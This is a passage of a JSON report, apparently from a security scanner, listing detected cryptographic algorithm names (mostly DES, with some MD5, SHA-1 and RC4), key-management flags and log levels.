          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "md5",
          "des",
          "md5",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "sha1",
          "des",
          "des",
          "md5",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "sha1",
          "des",
          "sha1",
          "des",
          "md5",
          "sha1",
          "des",
          "md5",
          "des",
          "des",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "sha1",
          "des",
          "md5",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "sha1",
          "des",
          "des",
          "md5",
          "sha1",
          "des",
          "md5",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "sha1",
          "des",
          "md5",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "des",
          "md5",
          "des",
          "des",
          "md5",
          "des",
          "des",
          "des",
          "md5",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "sha1",
          "des",
          "sha1",
          "des",
          "md5",
          "des",
          "des",
          "md5",
          "des",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "md5",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "des",
          "rc4",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "sha1",
          "des",
          "des",
          "des",
          "md5",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "des",
          "des",
          "des",
          "md5",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "sha1",
          "des",
          "des",
          "md5",
          "des",
          "des",
          "md5",
          "des",
          "md5",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "sha1",
          "des",
          "des",
          "des",
          "md5",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "sha1",
          "des",
          "des",
          "md5",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "rc4",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "des",
          "rc4",
          "des",
          "md5",
          "sha1",
          "des",
          "rc4",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "sha1",
          "des",
          "md5",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "des",
          "des",
          "md5",
          "des",
          "md5",
          "des",
          "md5",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "rc4",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "rc4",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "des",
          "des",
          "des",
          "des",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "sha1",
          "des",
          "md5",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "rc4",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "rc4",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "rc4",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "des",
          "des",
          "des",
          "des",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "sha1",
          "des",
          "md5",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "des",
          "des",
          "md5",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "sha1",
          "des",
          "md5",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "des",
          "md5",
          "des",
          "md5",
          "des",
          "md5",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "des"
        ],
        "random_number_generation": true,
        "key_derivation": [
          "secure_kdf_found",
          "secure_kdf_found",
          "secure_kdf_found",
          "secure_kdf_found",
          "secure_kdf_found",
          "secure_kdf_found",
          "secure_kdf_found",
          "secure_kdf_found",
          "secure_kdf_found",
          "secure_kdf_found",
          "secure_kdf_found",
          "secure_kdf_found",
          "secure_kdf_found",
          "secure_kdf_found",
          "secure_kdf_found",
          "secure_kdf_found",
          "secure_kdf_found",
          "secure_kdf_found",
          "secure_kdf_found",
          "secure_kdf_found",
          "secure_kdf_found",
          "secure_kdf_found"
        ]
      },
      "key_management": {
        "key_rotation": true,
        "key_storage": "secure",
        "key_derivation": true,
        "hardware_security_modules": true
      }
    },
    "monitoring_security": {
      "logging_security": {
        "structured_logging": true,
        "log_levels": [
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "DEBUG",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "DEBUG",
          "WARNING",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "DEBUG",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "DEBUG",
          "INFO",
          "DEBUG",
          "INFO",
          "DEBUG",
          "DEBUG",
          "INFO",
          "DEBUG",
          "INFO",
          "DEBUG",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "DEBUG",
          "INFO",
          "INFO",
          "DEBUG",
          "WARNING",
          "ERROR",
          "ERROR",
          "WARNING",
          "DEBUG",
          "WARNING",
          "ERROR",
          "CRITICAL",
          "INFO",
          "WARNING",
          "INFO",
          "DEBUG",
          "INFO",
          "DEBUG",
          "DEBUG",
          "WARNING",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "WARNING",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "INFO",
          "INFO",
          "DEBUG",
          "WARNING",
          "ERROR",
          "ERROR",
          "WARNING",
          "DEBUG",
          "WARNING",
          "ERROR",
          "CRITICAL",
          "INFO",
          "WARNING",
          "INFO",
          "DEBUG",
          "INFO",
          "DEBUG",
          "DEBUG",
          "WARNING",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "WARNING",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "INFO",
          "DEBUG",
          "INFO",
